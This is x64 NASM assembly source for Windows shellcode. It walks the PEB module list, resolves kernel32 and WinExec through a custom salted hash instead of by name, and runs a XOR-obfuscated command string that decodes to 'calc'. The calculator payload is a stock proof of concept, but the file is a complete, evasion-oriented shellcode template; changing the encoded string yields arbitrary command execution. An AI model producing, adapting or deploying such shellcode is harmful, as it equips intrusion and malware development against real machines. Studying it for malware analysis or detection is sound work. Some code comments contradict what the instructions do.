BITS 64
global main

%define OFFSET_LDR_INMEMORDERMODULE     0x20
%define OFFSET_INMEMORY_LINK_OFFSET     0x10
%define OFFSET_BASE_DLL_NAME_PTR        0x60
%define OFFSET_BASE_DLL_NAME_LEN        0x58
%define OFFSET_BASE_DLL_BASE            0x30
%define OFFSET_OPTIONAL_HEADER          0x18
%define OFFSET_DATA_DIRECTORY           0x70
%define OFFSET_E_IFANEW                 0x3c 
%define OFFSET_ADDRESS_OF_NAMES         0x20
%define OFFSET_ADDRESS_OF_FUNCTIONS     0x1c
%define OFFSET_ADDRESS_OF_NAMEORDINALS  0x24
%define DLL_BASE_PTR                    [rsp + 32]
%define MODULE_LOAD_COUNTER             [rsp + 40] 
%define WINEXEC_PTR                     [rsp + 48]
%define CALC_STR_PTR                    [rsp + 56]
%define VLA_SPACE_RVA                   88

; Hashing algo values
%define SALT                            97
%define SALT_2                          113
%define XOR_STEP                        167

%define ASCII_STR_TYPE                  1
%define WIDE_STR_TYPE                   2  
   
%define WINEXEC_HASH                	0xF65E2987        
%define KERNEL32_HASH                   0xD24FDEFF

%define PWN_IDX                         1
%define XOR_KEY                         125


section .text
main:
and rsp, -16
sub rsp, 192

; Get PEB
mov rax, gs:[0x60]       ; rax = PEB

; Get PEB->Ldr
mov rax, [rax + 0x18]    ; rax = PEB->Ldr
           
; Get InMemoryOrderModuleList (LIST_ENTRY) which contains a pointer to InMemoryOrderLinks linked lists
mov rax, [rax + OFFSET_LDR_INMEMORDERMODULE]   ; rax = InMemoryOrderModuleList.Flink a pointer to a InMemoryOrderLinks struct within a LDR_DATA_TABLE_ENTRY struct
mov r12, rax            ; r12 = Compare value
mov r13, rax            ; r13 = loop value

.main_loop:
; Calculate LDR_DATA_TABLE_ENTRY base (current - 0x10)
mov r14, [r13]          ; derefs the head list entry. similar to flink->flink
mov r13, r14            ; stores that flink in loop value to advance the loop

; Flink is in InMemoryOrderLinks which is a struct in LDR_DATA_TABLE_ENTRY at offset 0x10 so we minus to get the base of LDR_DATA
sub r14, OFFSET_INMEMORY_LINK_OFFSET

mov r15, [r14 + OFFSET_BASE_DLL_BASE]   ; move dllbase addr to r15
mov DLL_BASE_PTR, r15                     ; store dllbase address in stack

; Get module name (BaseDllName.Buffer at offset 0x60) pointer and store on stack
movzx rcx, word [r14 + OFFSET_BASE_DLL_NAME_LEN]    ; rcx = BaseDllName.Length
shr rcx, 1                                          ; divide wide length to ascii
mov rbx, [r14 + OFFSET_BASE_DLL_NAME_PTR]       ; BaseDllName.Buffer addr

cmp r12, r13            ; if (compare value) and (loop value) are the same, the loop is over
je .end

mov rsi, rbx                        ; func string
mov r8d, WIDE_STR_TYPE             ; string type

call hashing_func

cmp eax, KERNEL32_HASH             ; check if rcx(BaseDllName.Length) is = 12 wchars in size. if not, jump to main_loop
jne .main_loop

; load kernel32 value to ax and BaseDllName.Buffer value to rdi    
xor al, al                
mov byte MODULE_LOAD_COUNTER, al       ; this address will hold a counter for storing modules. DO NOT CHANGE

; initialization
mov rsi, rbx                        ; BaseDllName.Buffer string
mov r8d, WIDE_STR_TYPE              ; string type

call hashing_func                   ; hash the BaseDllName.Buffer string

; if it's kernel32 hash, goto the next loop else repeat
cmp eax, KERNEL32_HASH
jne .main_loop          
jmp .kernel32_walk_loop
      

.kernel32_walk_loop:
; reset registers just in case
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor r9, r9 

mov r14, DLL_BASE_PTR

mov rcx, r14
mov eax, dword [r14 + OFFSET_E_IFANEW]  ;elf_new
add rcx, rax                            ; nt header

mov eax, dword [rcx + OFFSET_OPTIONAL_HEADER + OFFSET_DATA_DIRECTORY]     ;ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress = IMAGE_EXPORT_DIRECTORY struct rva

add r14, rax                    ; IMAGE_EXPORT_DIRECTORY address

mov eax, dword [r14 + OFFSET_ADDRESS_OF_NAMES]          ; IMAGE_EXPORT_DIRECTORY struct + OFFSET_ADDRESS_OF_NAMES =  AddressOfNames rva
mov ecx, dword [r14 + OFFSET_ADDRESS_OF_FUNCTIONS]      ; IMAGE_EXPORT_DIRECTORY struct + OFFSET_ADDRESS_OF_FUNCTIONS =  AddressOfFunctions rva
mov edx, dword [r14 + OFFSET_ADDRESS_OF_NAMEORDINALS]   ; IMAGE_EXPORT_DIRECTORY struct + ADDRESS_OF_NAMEORDINALS =  AddressOfNameOrdinals rva

; store dll base in r14 then add it with r9, r10, r11 to get pointers to a list of rvas that lead to names, functions. and ordinals(ord list doesnt have rvas it has words) respectively
mov r14, DLL_BASE_PTR
mov r9, r14          
add r9, rax             ; list of AddressOfNames rvas 
mov r10, r14 
add r10, rcx            ; list of AddressOfFunctions rvas 
mov r11, r14 
add r11, rdx            ; list of AddressOfNameOrdinals rvas

.kernel32_func_search_loop:
mov r14, DLL_BASE_PTR     
mov r15, DLL_BASE_PTR           ; store the dll base

mov eax, [r9 + rbx * 4]         ; AddressOfNames[rbx] 
movzx edx, word [r11 + rbx * 2] ; AddressOfNameOrdinals[rbx]
mov ecx, [r10 + rdx * 4]        ; AddressOfFunctions[ordinal]

add r14, rax                    ; add the dll base with the function name rva  to get the func name string
add r15, rcx                    ; add the dll base with the function addr rva rva to get the func addr

mov rsi, r14                        ; func string
mov r8d, ASCII_STR_TYPE             ; string type

call hashing_func

inc rbx 

cmp eax, WINEXEC_HASH
je .store_winexec_addr

cmp byte MODULE_LOAD_COUNTER, 1
je .exec_func

jmp .kernel32_func_search_loop

.store_winexec_addr:
mov WINEXEC_PTR, r15             ; getproc function addr
add byte MODULE_LOAD_COUNTER, 1
jmp .kernel32_func_search_loop


.exec_func:
xor rbx, rbx                            ; VLA counter

; Load the strings to their pointers
mov rcx, PWN_IDX                     ; rcx = the index of string to get
lea rdx, [rsp + VLA_SPACE_RVA + rbx]    ; rdx = stack space to write the decoded string to
call get_xor_string
mov CALC_STR_PTR, rax

sub rsp, 32
mov rcx, [rsp + 56 + 32]		     
xor rdx, rdx            
call [rsp + 48 + 32]
add rsp, 32

.end:
ret


hashing_func:
;preserve these
push rbx
push rdi
push r10
push r11

; initialization
xor eax, eax                        ; Hash value
xor ebx, ebx                        ; Type aware iterator
xor ecx, ecx                        ; Raw iterator

.hash_loop:
;If r8d is wide move the wide value to di to process it
cmp r8d, WIDE_STR_TYPE
je .load_wide
jne .load_ascii

.load_ascii:
movzx edi, byte [rsi + rcx]         ; Load ASCII string(processed by default)  
jmp .hash_calc    

.load_wide:
movzx edi, word [rsi + rcx]         ; Load WIDE string
jmp .hash_calc


.hash_calc:      
; if edi is 0, jump to the end
test edi, edi
je .return

; xor the salts then xor the type aware iterator value and store in edx. edx = (SALT ^ SALT_2 ^ i)
mov edx, SALT ^ SALT_2
xor edx, ebx       

; bitwise shift the hash by 6. r10d = (hash << 6)
mov r10d, eax
shl r10d, 6           

; bitwise shift the hash by 6. r11d = (hash << 16)
mov r11d, eax
shl r11d, 16 

; reset and add all values to r13d then subtract that value by the hash. r13d = string[i] + (salt1 ^ salt2 ^ i) + (hash << 6) + (hash << 16) - hash;
add r11d, edi
add r11d, edx
add r11d, r10d

sub r11d, eax

mov eax, r11d                       ; move the hash from temp hash(r13d) to hash(eax)
add ecx, r8d                        ; advance the raw iterator
mov ebx, ecx

; if string is wide div the type aware iterator by 2 to get an accurate wide iterator then loop else just loop
cmp r8d, WIDE_STR_TYPE
jne .hash_loop

shr ebx, 1
jmp .hash_loop

.return:                   
xor eax, XOR_STEP                   ; xor the result to get the hash
pop r11
pop r10
pop rdi
pop rbx
ret



get_xor_string:
cmp cl, PWN_IDX 
je calc_str


load_string_addr_to_reg:
pop r8                                  ; gets the string address in memory       
xor rcx, rcx

; stores  the string pointer at r10
mov rax, rdx
add rax, rcx

.decryption_loop:
lea r9, [rdx + rcx]                     ; stores the stack addr to write the string in r9
movzx r10, byte [r8 + rcx]              ; moves the value of each char to r10
xor r10b, XOR_KEY                       ; xor the enc char to get the original char 
mov [r9], r10b                          ; deref the stack addr then write the char in r10 to the addr
inc rcx                                 ; increase rcx by the data written
    
test r10b, r10b
je .exit                                ; If a null char string is done. jmp to exit

jmp .decryption_loop                    ; loop until null

.exit:
add rbx, rcx                            ; make rbx the rva of the next free space on the stack
ret

calc_str:
call load_string_addr_to_reg
calc_string db 0x1E, 0x1C, 0x11, 0x1E, 0x7D
